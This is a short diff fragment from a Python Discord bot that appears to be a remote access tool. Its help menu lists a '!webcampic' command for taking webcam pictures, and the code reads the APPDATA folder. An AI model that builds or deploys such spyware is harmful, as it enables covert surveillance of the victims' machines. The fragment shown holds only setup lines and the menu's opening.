@@ -15,11 +15,14 @@ import asyncio
 import discord
 import atexit
 global py
-token = ''
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
 bot = commands.Bot(command_prefix='!')
+
+chosen = None
+uuidgen = None
+
 helpmenu = """
 Availaible commands are :
 --> !webcampic = Take a picture from the webcam
